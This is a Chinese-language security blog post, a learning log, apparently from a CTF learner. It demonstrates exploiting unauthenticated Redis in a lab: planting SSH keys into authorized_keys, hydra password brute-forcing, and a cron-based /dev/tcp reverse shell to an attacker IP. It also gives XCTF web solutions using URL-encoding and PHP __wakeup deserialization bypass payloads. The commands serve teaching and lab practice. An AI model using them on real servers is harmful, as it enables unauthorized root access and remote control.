@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="https://cuokon.github.io/live2d/autoload.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "23b069a1"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make  步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptabl">
+<meta name="keywords" content="redis未授权,ctf,资源分享">
+<meta property="og:type" content="article">
+<meta property="og:title" content="8&#x2F;28(redis未授权,xctf)">
+<meta property="og:url" content="http://cuokon.github.com/2019/08/28/redis/index.html">
+<meta property="og:site_name" content="错空&#39;s Blog">
+<meta property="og:description" content="漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make  步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptabl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/1redis%E9%A1%B5%E9%9D%A2%E5%90%AF%E5%8A%A8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/2%E6%B5%8B%E8%AF%95%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/3%E6%9B%B4%E6%94%B9bind.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/4%E6%9B%B4%E6%94%B9requirepass.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/5nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/6ssh%E5%85%AC%E9%92%A5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/7%E4%BF%AE%E6%94%B9ssh.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/8%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BC%93%E5%86%B2%E5%8C%BA.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/9%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5redis.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/10ssh%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/11%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/12hydra%E7%88%86%E7%A0%B4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/13msf%E7%88%86%E7%A0%B4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/14%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/15nc%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/16%E8%AE%BE%E7%BD%AEpayload.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/17%E5%8F%8D%E5%BC%B9shell.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/18php2%E9%A2%98%E7%9B%AE.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/19%E7%88%86%E7%A0%B4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/20%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/21url%E5%AF%B9%E7%85%A7%E8%A1%A8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/22php2flag.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/23unserialize3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/24%E5%BA%8F%E5%88%97%E5%8C%96.png">
+<meta property="og:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/25unserize3flag.png">
+<meta property="og:updated_time" content="2019-08-28T00:40:40.224Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="8&#x2F;28(redis未授权,xctf)">
+<meta name="twitter:description" content="漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make  步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptabl">
+<meta name="twitter:image" content="http://cuokon.github.com/image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/1redis%E9%A1%B5%E9%9D%A2%E5%90%AF%E5%8A%A8.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://cuokon.github.com/2019/08/28/redis/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>8/28(redis未授权,xctf) | 错空's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">错空's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学无止境</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/08/28/redis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cuo kon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/43626445">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="错空's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">8/28(redis未授权,xctf)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-28 21:21:36 / 修改时间：08:40:40" itemprop="dateCreated datePublished" datetime="2019-08-28T21:21:36+08:00">2019-08-28</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习记录/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+		  
+		  
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">2.8k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">3 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="漏洞篇"><a href="#漏洞篇" class="headerlink" title="漏洞篇"></a>漏洞篇</h2><h3 id="redis未授权访问漏洞利用"><a href="#redis未授权访问漏洞利用" class="headerlink" title="redis未授权访问漏洞利用"></a>redis未授权访问漏洞利用</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p> 步骤1:下载和安装<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.17.tar.gz</span><br><span class="line">$ cd redis-2.8.17</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
+<p> 步骤2:启动redis服务(<code>在redis目录下运行下面命令</code>)<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ service iptables stop 		# 防止后面因为防火墙的原因连接不了redis</span><br><span class="line">$ cd src</span><br><span class="line">$ ./redis-server ../redis.conf      #可以省略后面的../redis.conf,这样的话就是默认配置</span><br></pre></td></tr></table></figure></p>
+<p> 启动页面如图:<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/1redis%E9%A1%B5%E9%9D%A2%E5%90%AF%E5%8A%A8.png" alt="1redis页面启动"><br> <code>攻击机也要安装redis和步骤1一样(不用做步骤2)</code><br> 如果没有安装成功可以参考此<a href="https://www.runoob.com/redis/redis-install.html" target="_blank" rel="noopener">文章</a></p>
+<p> 然后测试一下远程连接,在攻击远程目标的redis<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./redis-cli -h 172.16.5.55</span><br></pre></td></tr></table></figure></p>
+<p> 如图表示连接成功:</p>
+<p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/2%E6%B5%8B%E8%AF%95%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5.png" alt="2测试远程连接"></p>
+<p> 如果没有连接成功有可能是因为bind或者设置了密码设置成了127.0.0.1,可以更改配置文件<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi redis.conf</span><br></pre></td></tr></table></figure></p>
+<p> 可以在前面添加一个#或者把127.0.0.1改为0.0.0.0<br> 如图:<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/3%E6%9B%B4%E6%94%B9bind.png" alt="3更改bind"><br> 在requirepass添加注释<br> 如图:<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/4%E6%9B%B4%E6%94%B9requirepass.png" alt="4更改requirepass"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ssh无密码连接"><a href="#ssh无密码连接" class="headerlink" title="ssh无密码连接"></a>ssh无密码连接</h3><p> 讲一下ssh无密码连接的思路<br> 1.生成ssh公钥<br> 2.把ssh公钥传入redis缓存里面<br> 3.修改ssh公钥<br> 4.把redis缓存修改为/root/.ssh/</p>
+<p> 首先用nmap工具对目标进行扫描<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/5nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" alt="5nmap扫描结果"><br> <code>画箭头那里Bind是0.0.0.0表示任意ip都可以连接</code><br> 我们先生成一个ssh公钥<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>
+<p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/6ssh%E5%85%AC%E9%92%A5.png" alt="6ssh公钥"><br> 修改ssh公钥(为了防止公钥与其他数据连接在一起)<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/7%E4%BF%AE%E6%94%B9ssh.png" alt="7修改ssh"></p>
+<p> 把key.txt添加到缓冲区<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /root/key.txt | ./redis-cli -h 172.16.5.55 -x set xxx</span><br></pre></td></tr></table></figure></p>
+<p> <img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/8%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BC%93%E5%86%B2%E5%8C%BA.png" alt="8文件输出到缓冲区"><br>远程连接redis然后修改配置,然后输入如下命令<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./redis-cli -h 172.16.5.55</span><br><span class="line">$ config set dir /root/.ssh</span><br><span class="line">$ config set dbfilename authorized_keys</span><br><span class="line">$ save</span><br></pre></td></tr></table></figure></p>
+<p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/9%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5redis.png" alt="9远程连接redis"><br>最后连接目标服务器<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/10ssh%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="10ssh连接成功"></p>
+<h3 id="如果目标是存在弱密码的我们可以用hydra进行爆破"><a href="#如果目标是存在弱密码的我们可以用hydra进行爆破" class="headerlink" title="如果目标是存在弱密码的我们可以用hydra进行爆破"></a>如果目标是存在弱密码的我们可以用hydra进行爆破</h3><p>先为目标设置一个密码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>按照如下修改<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/11%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81.png" alt="11设置密码"><br>然后用hydra进行爆破<br><code>hydra -P pass.txt redis://172.16.5.55</code><br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/12hydra%E7%88%86%E7%A0%B4.png" alt="12hydra爆破"><br>还可以用msf进行爆破<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/13msf%E7%88%86%E7%A0%B4.png" alt="13msf爆破"><br>爆破成功得到密码后就可以连接了<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/14%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="14连接成功"></p>
+<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>思路与上面相同更改redis存储的文件</p>
+<p>具体命令如下<br>先用nc监听端口<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/15nc%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3.png" alt="15nc监听端口"><br>远程连接redis进行配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.5.23/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/16%E8%AE%BE%E7%BD%AEpayload.png" alt="16设置payload"><br>过1分钟左右就可以看到shell已经反弹过来了<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/17%E5%8F%8D%E5%BC%B9shell.png" alt="17反弹shell"></p>
+<h2 id="xctf-web-篇"><a href="#xctf-web-篇" class="headerlink" title="xctf(web)篇"></a>xctf(web)篇</h2><h3 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h3><p><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/18php2%E9%A2%98%E7%9B%AE.png" alt="18php2题目"><br>发现什么都没有,然后有工具来了一波爆破<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/19%E7%88%86%E7%A0%B4.png" alt="19爆破"><br>看到了个index.phps文件,然后访问看看<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/20%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2.png" alt="20代码泄露"><br>发现了代码泄露,通过审计发现要满足以下条件才可以拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.$_GET[&apos;id&apos;]!==&quot;admin&quot;</span><br><span class="line">2.$_GET[&apos;id&apos;]===&quot;admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样看起来很绕,他第一次判断是否等于admin,如果等于就输出并且退出,然后中间那里有一个urldecode(),然后在判断是否大于admin如果等于的话就输出flag。所以所有的关键就在urldecode()这个函数,这个函数是用来url解码的。所以我们可以对admin进行一次urldecode<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/21url%E5%AF%B9%E7%85%A7%E8%A1%A8.png" alt="21url对照表"><br>然后我们只用把a变成%61然后对%61进行编码就可以绕过了(因为浏览器默认会进行一次url编码,所以我们这里还要编码一次)<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/22php2flag.png" alt="22php2flag"></p>
+<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p>题目页面:<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/23unserialize3.png" alt="23unserialize3"><br>看到class类和<strong>wakeup就想到了反序列化漏洞,__wakeup会在反序列化的时候执行他里面的代码,所以要想办法绕过</strong>wakeup这里,然后<strong>wakeup有一个漏洞就是在反序列化时他的对象属性个数的值大于真实个数的属性就会跳过</strong>wakeup去执行。<br>例如:<code>O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:4:&quot;test&quot;;}</code>我们把1改成2他就会跳过__wakeup。因为括号里面只有1个属性,但是我们在外面说有2个属性所以他就会跳过<br>这样题目就很简单了<br>先对代码进行序列化得到<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/24%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="24序列化"><br>然后把属性1变成属性2最后的payload是:<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>然后提交得到flag<br><img src="../../../../image/redis%E6%9C%AA%E6%8E%88%E6%9D%83/25unserize3flag.png" alt="25unserize3flag"></p>
+<h2 id="一些好的文章"><a href="#一些好的文章" class="headerlink" title="一些好的文章"></a>一些好的文章</h2><p>c2:<br><a href="https://github.com/platdrag/UnblockableChains" target="_blank" rel="noopener">https://github.com/platdrag/UnblockableChains</a><br><a href="https://iwantmore.pizza/posts/dnscat2-over-doh.html" target="_blank" rel="noopener">https://iwantmore.pizza/posts/dnscat2-over-doh.html</a><br><a href="https://www.freebuf.com/sectool/210450.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/210450.html</a></p>
+<p>面试技巧:<br><a href="https://github.com/FeeiCN/SecurityInterviewQuestions" target="_blank" rel="noopener">https://github.com/FeeiCN/SecurityInterviewQuestions</a></p>
+<p>ThinkPHP漏洞:<br><a href="https://github.com/Mochazz/ThinkPHP-Vuln/" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p>
+<p>工具:<br><a href="https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29" target="_blank" rel="noopener">https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29</a><br><a href="https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1" target="_blank" rel="noopener">https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1</a><br><a href="https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0</a></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+
+
+    
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>cuo kon</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://cuokon.github.com/2019/08/28/redis/" title="8/28(redis未授权,xctf)">http://cuokon.github.com/2019/08/28/redis/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/redis未授权/" rel="tag"># redis未授权</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/资源分享/" rel="tag"># 资源分享</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/28/wfuzz/" rel="next" title>
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
